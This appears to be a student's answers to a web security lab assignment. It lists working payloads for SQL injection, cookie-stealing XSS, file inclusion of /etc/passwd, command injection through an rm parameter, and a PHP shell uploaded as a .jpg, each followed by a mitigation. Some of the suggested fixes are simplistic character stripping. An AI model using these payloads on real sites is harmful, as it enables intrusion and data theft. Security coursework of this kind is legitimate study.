Homework 4 Answers

Question 1: 
	(1) '; INSERT INTO users (username, password) VALUES ('username', 'password');--
	(2) To stop or minimize the risk of SQL injections, you want to sanitize the user input. For starters, you could easily remove ;'s and --'s for user input.
Question 2:
	(1) <<scriptscript> alert(document.cookie); </script>
	(2) Would definetly need to sanitize user input better. Replace the scripts with spaces or simply just replace all <,>'s with spaces instead of looking for specific tags like <script>.
Question 3:
	(1) view-source:http://<ip>/index.php?theme=/etc/passwd
	(2) To fix this sensitive website information from being leaked you should specify all of the themes that are allowed. In short, create a whitelist for the events that can be chosen.
Question 4:
	(1) http://<ip>/gallery.php?removeImage=upload1681766753.jpg;cat+/etc/passwd
	(2) The removeImage variable would need to be sanitized before executing the rm command. Remove such characters as ;,/, etc.
Question 5:
	(1) To do this, simply add file extension .jpg to the end of shellcode.php since the website only goes through with files with the extension of jpg.
		The "image" (php script) was assigned images/upload671142738.jpg
		http://<ip>/gallery.php?theme=images/upload671142738.jpg
		To enable this script after it is on the website:
		http://<ip>/gallery.php?theme=images/upload671142738.jpg&command=cat+/etc/passwd
	(2) To avoid this, scrub through the images uploaded by users and sanitize them. You should be able to open the jpg file and read the image contents (rgb values).
Question 6:
